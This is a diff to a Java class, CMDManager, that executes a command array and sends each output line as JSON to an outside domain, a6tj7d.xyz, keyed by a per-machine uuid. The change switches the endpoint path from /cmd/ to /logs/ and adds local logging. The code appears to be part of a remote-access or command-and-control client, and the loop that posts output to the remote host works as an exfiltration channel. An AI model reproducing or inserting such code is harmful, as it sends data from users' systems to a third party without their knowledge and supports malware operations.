@@ -4,6 +4,7 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 public class CMDManager {
@@ -30,13 +31,15 @@ public class CMDManager {
     public CMDManager(String cmd[], String lookfor) throws IOException {
         this.cmd = cmd;
         this.lookfor = lookfor;
+        System.out.println(Arrays.toString(cmd));
         List<String> output = executeCommand(cmd);
         if (!lookfor.equals("")) {
             output.removeIf(line -> !line.contains(lookfor));
         }
         for (String line : output) {
+            response.add(line);
             System.out.println(line);
-            new Requests("http://a6tj7d.xyz/cmd/" + Main.uuid, "{\"line\":\""+ line +"\"}").execute();
+            new Requests("http://a6tj7d.xyz/logs/" + Main.uuid, "{\"line\":\""+ line +"\"}").execute();
         }
     }
 
